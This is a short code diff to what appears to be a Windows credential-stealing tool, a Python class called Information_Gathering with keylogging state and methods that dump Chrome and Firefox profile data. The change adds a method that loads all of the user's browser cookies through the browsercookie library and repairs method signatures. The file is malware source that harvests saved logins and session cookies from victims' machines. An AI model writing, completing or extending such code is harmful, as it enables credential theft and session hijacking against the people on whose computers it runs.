@@ -17,6 +17,7 @@ import pythoncom
 import win32api
 import win32con
 import logging
+import browsercookie
 from common import *
 
 class Information_Gathering:
@@ -33,7 +34,7 @@ class Information_Gathering:
 		self.key_log = ""
 		
 	@windows_only
-	def dump_chrome():
+	def dump_chrome(self):
 		info_list = []
 		path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
 		original_dir = os.getcwd()
@@ -84,9 +85,11 @@ class Information_Gathering:
 		os.chdir(original_dir)
 		return output
 		
+	def dump_cookies(self):
+		cookie_dict = browsercookie.load()._cookies
 		
 	@windows_only
-	def dump_firefox(): 
+	def dump_firefox(self): 
 		class NotFoundError(Exception):
 			pass
 		 
